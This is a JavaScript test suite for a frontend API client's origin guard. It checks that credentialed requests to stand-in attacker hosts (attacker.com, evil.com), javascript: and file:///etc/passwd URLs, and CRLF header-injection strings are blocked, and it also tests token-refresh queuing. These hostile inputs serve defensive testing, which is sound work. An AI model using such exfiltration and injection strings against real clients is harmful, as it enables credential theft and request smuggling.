import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { createPinia, setActivePinia } from 'pinia'
import api, {
  resolveConfiguredApiOrigin,
  assertSafeRequestDestination
} from '../services/api'
import { useAuthStore } from '../stores/authStore'

describe('SEC-02: Transport Destination Security Guard & Credential Confinement', () => {
  let originalAdapter
  let dispatchedRequests = []
  let authStore

  beforeEach(() => {
    setActivePinia(createPinia())
    authStore = useAuthStore()
    authStore.token = 'synthetic-jwt-operator-token-sec02'

    dispatchedRequests = []
    originalAdapter = api.defaults.adapter

    // In-memory recording adapter that does NOT send external network traffic
    api.defaults.adapter = async (config) => {
      dispatchedRequests.push({
        url: config.url,
        baseURL: config.baseURL,
        fullUri: api.getUri(config),
        method: config.method,
        headers: { ...config.headers },
        withCredentials: config.withCredentials,
        responseType: config.responseType,
        timeout: config.timeout,
        data: config.data,
        signal: config.signal,
        allowAbsoluteUrls: config.allowAbsoluteUrls
      })

      return {
        data: { success: true, message: 'test-response-ok' },
        status: 200,
        statusText: 'OK',
        headers: { 'content-type': 'application/json' },
        config
      }
    }
  })

  afterEach(() => {
    api.defaults.adapter = originalAdapter
    if (authStore) {
      authStore.$reset()
    }
    vi.restoreAllMocks()
    vi.unstubAllEnvs()
  })

  describe('1. Pre-Dispatch Origin Confinement & Override Rejection', () => {
    it('dispatches legitimate relative API requests bounded to the configured origin', async () => {
      const response = await api.get('/transactions/active')

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].url).toBe('/transactions/active')
      expect(dispatchedRequests[0].withCredentials).toBe(true)
      expect(dispatchedRequests[0].headers.Authorization).toBe(
        'Bearer synthetic-jwt-operator-token-sec02'
      )
    })

    it('rejects per-request baseURL override toward unauthorized external origin (0 dispatch)', async () => {
      const overridePromise = api.get('/leak-data', {
        baseURL: 'http://attacker.com/api'
      })

      await expect(overridePromise).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('rejects protocol-relative URLs attempting to escape to external hosts (0 dispatch)', async () => {
      const attackPromise = api.get('//attacker.com/evil-endpoint')

      await expect(attackPromise).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('rejects absolute external HTTP/HTTPS URLs (0 dispatch)', async () => {
      const externalPromise = api.get('https://malicious-site.com/steal')

      await expect(externalPromise).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('rejects port alteration even if hostname matches (0 dispatch)', async () => {
      const currentOrigin =
        typeof window !== 'undefined' && window.location?.origin
          ? window.location.origin
          : 'http://localhost'
      const originUrl = new URL(currentOrigin)
      const currentPort = originUrl.port ? parseInt(originUrl.port, 10) : 80
      const differentPort = currentPort === 9999 ? 8888 : 9999
      const portAttackUrl = `${originUrl.protocol}//${originUrl.hostname}:${differentPort}/api/leak`

      await expect(api.get(portAttackUrl)).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })
  })

  describe('2. Protocol Schemes & Character Ambiguity Guards', () => {
    it('rejects unsupported URI schemes before adapter dispatch (0 dispatch)', async () => {
      const invalidSchemes = [
        'javascript:alert(1)',
        'data:text/html;base64,PHNjcmlwdD4=',
        'file:///etc/passwd',
        'ftp://files.example.com/dump'
      ]

      for (const badScheme of invalidSchemes) {
        await expect(api.get(badScheme)).rejects.toThrow(
          /Permintaan ditolak: Skema protokol URL tidak diizinkan/i
        )
      }
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('rejects backslashes, control characters, and newlines in URL (0 dispatch)', async () => {
      const ambiguousUrls = [
        '/api/\\attacker.com',
        '\\attacker.com/leak',
        '/auth/login\r\nHost: evil.com',
        '/auth/login\0',
        '/auth/login\ttest'
      ]

      for (const ambiguousUrl of ambiguousUrls) {
        await expect(api.get(ambiguousUrl)).rejects.toThrow(
          /Permintaan ditolak: URL memuat karakter tidak valid atau ambigu/i
        )
      }
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('rejects ambiguous characters and unsupported schemes in baseURL overrides (0 dispatch)', async () => {
      const ambiguousBases = [
        { baseURL: '/api\\evil.com', url: '/test' },
        { baseURL: '\\attacker.com/api', url: '/test' },
        { baseURL: '/api\r\nHost: evil.com', url: '/test' },
        { baseURL: '/api\0', url: '/test' },
        { baseURL: '/api\ttest', url: '/test' },
        { baseURL: 'ftp://evil.com/api', url: '/test' },
        { baseURL: 'javascript:alert(1)', url: '/test' }
      ]

      for (const reqConfig of ambiguousBases) {
        await expect(api.get(reqConfig.url, reqConfig)).rejects.toThrow(
          /Permintaan ditolak: (URL memuat karakter tidak valid atau ambigu|Skema protokol URL tidak diizinkan)/i
        )
      }
      expect(dispatchedRequests).toHaveLength(0)
    })
  })

  describe('3. Independent Origin Resolution Semantics & Configuration Fail-Closed', () => {
    it('resolves production relative configuration to the page origin', () => {
      const prodOrigin = resolveConfiguredApiOrigin('/api')
      const expectedPageOrigin =
        typeof window !== 'undefined' && window.location?.origin
          ? window.location.origin
          : 'http://localhost'
      expect(prodOrigin).toBe(expectedPageOrigin)
    })

    it('defaults safely to page origin when configuration is omitted (null or undefined)', () => {
      const currentOrigin =
        typeof window !== 'undefined' && window.location?.origin
          ? window.location.origin
          : 'http://localhost'
      expect(resolveConfiguredApiOrigin(undefined)).toBe(currentOrigin)
      expect(resolveConfiguredApiOrigin(null)).toBe(currentOrigin)
    })

    it('rejects malformed, unsupported, or ambiguous configurations fail-closed', () => {
      // 1. Malformed URL syntax
      expect(() => resolveConfiguredApiOrigin('http://[')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: format URL malformed/i
      )

      // 2. Unsupported protocol scheme (FTP)
      expect(() => resolveConfiguredApiOrigin('ftp://localhost/api')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: skema protokol/i
      )

      // 3. Protocol-relative network path
      expect(() => resolveConfiguredApiOrigin('//external.invalid/api')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: bentuk protocol-relative/i
      )

      // 4. Empty or whitespace-only string
      expect(() => resolveConfiguredApiOrigin('')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: string kosong tidak diizinkan/i
      )
      expect(() => resolveConfiguredApiOrigin('   ')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: string kosong tidak diizinkan/i
      )

      // 5. Non-string types
      expect(() => resolveConfiguredApiOrigin(123)).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: harus berupa string/i
      )

      // 6. Control characters, newlines, and backslashes
      expect(() => resolveConfiguredApiOrigin('/api\r\n')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: karakter kontrol atau backslash/i
      )
      expect(() => resolveConfiguredApiOrigin('/api\\test')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: karakter kontrol atau backslash/i
      )

      // 7. Missing hostname in absolute URL
      expect(() => resolveConfiguredApiOrigin('http://')).toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid/i
      )
    })

    it('fails module initialization when VITE_API_BASE_URL is invalid (fail-closed)', async () => {
      vi.resetModules()
      vi.stubEnv('VITE_API_BASE_URL', 'ftp://malicious.invalid/api')
      await expect(import('../services/api.js')).rejects.toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: skema protokol/i
      )

      vi.resetModules()
      vi.stubEnv('VITE_API_BASE_URL', 'http://[')
      await expect(import('../services/api.js')).rejects.toThrow(
        /Konfigurasi VITE_API_BASE_URL tidak valid: format URL malformed/i
      )
    })

    it('initializes module with cross-origin absolute API, dispatches legitimate requests, and strictly rejects relative baseURL overrides (0 dispatch)', async () => {
      vi.resetModules()
      vi.stubEnv('VITE_API_BASE_URL', 'http://localhost:3001/api')
      const { default: crossApi, resolveConfiguredApiOrigin: isolatedResolveOrigin } = await import(
        '../services/api.js'
      )

      expect(isolatedResolveOrigin()).toBe('http://localhost:3001')

      const isolatedDispatches = []
      crossApi.defaults.adapter = async (config) => {
        isolatedDispatches.push({
          url: config.url,
          baseURL: config.baseURL,
          fullUri: crossApi.getUri(config),
          headers: { ...config.headers }
        })
        return {
          status: 200,
          data: { success: true },
          headers: { 'content-type': 'application/json' },
          config
        }
      }

      // Legitimate relative request succeeds to official cross-origin API
      const response = await crossApi.get('/transactions/active')
      expect(response.status).toBe(200)
      expect(isolatedDispatches).toHaveLength(1)
      expect(isolatedDispatches[0].fullUri).toBe('http://localhost:3001/api/transactions/active')

      // Override baseURL: '/api' resolves to browser page origin and is rejected fail-closed (0 dispatch)
      await expect(crossApi.get('/leak', { baseURL: '/api' })).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(isolatedDispatches).toHaveLength(1)

      // Override baseURL: '' with relative path also resolves to browser page origin and is rejected (0 dispatch)
      await expect(crossApi.get('/leak', { baseURL: '' })).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(isolatedDispatches).toHaveLength(1)

      // Override baseURL to an unauthorized foreign origin is rejected (0 dispatch)
      await expect(crossApi.get('/leak', { baseURL: 'http://attacker.com/api' })).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(isolatedDispatches).toHaveLength(1)
    })
  })

  describe('4. allowAbsoluteUrls Semantics Alignment', () => {
    it('dispatches safe relative requests when allowAbsoluteUrls is explicitly false', async () => {
      const response = await api.get('/transactions/active', {
        allowAbsoluteUrls: false
      })

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].allowAbsoluteUrls).toBe(false)
      expect(dispatchedRequests[0].url).toBe('/transactions/active')
    })

    it('rejects unapproved external origin when allowAbsoluteUrls is true (default)', async () => {
      await expect(
        api.get('https://attacker.com/steal', { allowAbsoluteUrls: true })
      ).rejects.toThrow(
        /Permintaan ditolak: Tujuan transport berada di luar origin API resmi/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('treats absolute URL as relative path when allowAbsoluteUrls is false without leaking to external host', async () => {
      // When allowAbsoluteUrls is false, Axios buildFullPath appends the URL to baseURL:
      // baseURL '/api' + 'http://attacker.com/leak' => '/api/http://attacker.com/leak'
      // Guard verifies destination against browser page origin:
      // Target URL origin remains same-origin (safe API origin), NOT attacker.com!
      const response = await api.get('http://attacker.com/leak', {
        allowAbsoluteUrls: false
      })

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].allowAbsoluteUrls).toBe(false)
      // Dispatched destination is safely on the local API baseURL, never routed to attacker.com
      expect(dispatchedRequests[0].fullUri).toBe('/api/http://attacker.com/leak')
    })

    it('still rejects unsupported URI schemes even when allowAbsoluteUrls is false', async () => {
      await expect(
        api.get('javascript:alert(1)', { allowAbsoluteUrls: false })
      ).rejects.toThrow(
        /Permintaan ditolak: Skema protokol URL tidak diizinkan/i
      )
      expect(dispatchedRequests).toHaveLength(0)
    })
  })

  describe('5. Session & Interceptor Stability under Guard Rejection & Concurrent 401 Refresh', () => {
    it('does NOT clear session, trigger refresh, or mutate authStore when a request is blocked by guard', async () => {
      const initialToken = authStore.token

      try {
        await api.get('//attacker.com/steal-token')
      } catch (e) {
        // Expected to fail
      }

      // Assert that authStore token is completely preserved
      expect(authStore.token).toBe(initialToken)
      expect(dispatchedRequests).toHaveLength(0)
    })

    it('preserves 401 refresh token queue and retry cycle for legitimate API requests', async () => {
      let callCount = 0

      api.defaults.adapter = async (config) => {
        dispatchedRequests.push({
          url: config.url,
          fullUri: api.getUri(config),
          headers: { ...config.headers }
        })

        if (config.url === '/protected-resource' && callCount === 0) {
          callCount++
          const error = new Error('Request failed with status code 401')
          error.response = {
            status: 401,
            data: { message: 'Token expired' },
            config
          }
          error.config = config
          throw error
        }

        if (config.url === '/auth/refresh') {
          return {
            data: {
              data: { accessToken: 'new-refreshed-jwt-token-789' }
            },
            status: 200,
            statusText: 'OK',
            headers: { 'content-type': 'application/json' },
            config
          }
        }

        return {
          data: { success: true, payload: 'resource-delivered' },
          status: 200,
          statusText: 'OK',
          headers: { 'content-type': 'application/json' },
          config
        }
      }

      const res = await api.get('/protected-resource')

      expect(res.data.success).toBe(true)
      expect(authStore.token).toBe('new-refreshed-jwt-token-789')
      expect(dispatchedRequests).toHaveLength(3)
      expect(dispatchedRequests[0].url).toBe('/protected-resource')
      expect(dispatchedRequests[1].url).toBe('/auth/refresh')
      expect(dispatchedRequests[2].url).toBe('/protected-resource')
      expect(dispatchedRequests[2].headers.Authorization).toBe(
        'Bearer new-refreshed-jwt-token-789'
      )
    })

    it('handles concurrent 401 requests with single refresh execution and retries all queued requests through guard', async () => {
      let refreshCallCount = 0
      let attempts = {
        '/batch-resource-1': 0,
        '/batch-resource-2': 0
      }

      api.defaults.adapter = async (config) => {
        dispatchedRequests.push({
          url: config.url,
          fullUri: api.getUri(config),
          headers: { ...config.headers }
        })

        if (config.url === '/auth/refresh') {
          refreshCallCount++
          // Artificial micro-delay to allow concurrent requests to queue
          await new Promise((r) => setTimeout(r, 10))
          return {
            data: {
              data: { accessToken: 'concurrent-refreshed-jwt-999' }
            },
            status: 200,
            statusText: 'OK',
            headers: { 'content-type': 'application/json' },
            config
          }
        }

        if (config.url === '/batch-resource-1') {
          if (attempts['/batch-resource-1'] === 0) {
            attempts['/batch-resource-1']++
            const err = new Error('Request failed with status code 401')
            err.response = { status: 401, data: { message: 'Expired' }, config }
            err.config = config
            throw err
          }
          return {
            data: { success: true, item: 1 },
            status: 200,
            statusText: 'OK',
            headers: { 'content-type': 'application/json' },
            config
          }
        }

        if (config.url === '/batch-resource-2') {
          if (attempts['/batch-resource-2'] === 0) {
            attempts['/batch-resource-2']++
            const err = new Error('Request failed with status code 401')
            err.response = { status: 401, data: { message: 'Expired' }, config }
            err.config = config
            throw err
          }
          return {
            data: { success: true, item: 2 },
            status: 200,
            statusText: 'OK',
            headers: { 'content-type': 'application/json' },
            config
          }
        }

        return {
          data: { success: true },
          status: 200,
          statusText: 'OK',
          headers: { 'content-type': 'application/json' },
          config
        }
      }

      // Fire both requests concurrently
      const [res1, res2] = await Promise.all([
        api.get('/batch-resource-1'),
        api.get('/batch-resource-2')
      ])

      expect(res1.data.success).toBe(true)
      expect(res1.data.item).toBe(1)
      expect(res2.data.success).toBe(true)
      expect(res2.data.item).toBe(2)

      // Refresh was executed EXACTLY ONCE
      expect(refreshCallCount).toBe(1)
      expect(authStore.token).toBe('concurrent-refreshed-jwt-999')

      // Dispatched sequence:
      // 1. /batch-resource-1 (initial -> 401)
      // 2. /batch-resource-2 (initial -> 401, queued)
      // 3. /auth/refresh (refresh -> 200)
      // 4 & 5. /batch-resource-1 and /batch-resource-2 retried (both -> 200 with new token)
      expect(dispatchedRequests).toHaveLength(5)
      const refreshDispatches = dispatchedRequests.filter(r => r.url === '/auth/refresh')
      expect(refreshDispatches).toHaveLength(1)

      const retriedReq1 = dispatchedRequests.filter(r => r.url === '/batch-resource-1')[1]
      const retriedReq2 = dispatchedRequests.filter(r => r.url === '/batch-resource-2')[1]
      expect(retriedReq1.headers.Authorization).toBe('Bearer concurrent-refreshed-jwt-999')
      expect(retriedReq2.headers.Authorization).toBe('Bearer concurrent-refreshed-jwt-999')
    })
  })

  describe('6. Operational Payloads & Existing Contracts Preservation', () => {
    it('preserves FormData multipart payloads during upload', async () => {
      const formData = new FormData()
      formData.append('documentName', 'surat-jalan-001.pdf')
      formData.append('file', new Blob(['dummy-pdf-content']))

      const response = await api.post('/attachments/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      })

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].url).toBe('/attachments/upload')
      expect(dispatchedRequests[0].data).toBe(formData)
    })

    it('preserves Blob binary downloads and responseType config', async () => {
      const response = await api.get('/attachments/att-100/download', {
        responseType: 'blob'
      })

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].responseType).toBe('blob')
    })

    it('preserves custom timeout and AbortController signal', async () => {
      const controller = new AbortController()
      const response = await api.get('/heavy-report', {
        timeout: 25000,
        signal: controller.signal
      })

      expect(response.status).toBe(200)
      expect(dispatchedRequests).toHaveLength(1)
      expect(dispatchedRequests[0].timeout).toBe(25000)
      expect(dispatchedRequests[0].signal).toBe(controller.signal)
    })
  })
})
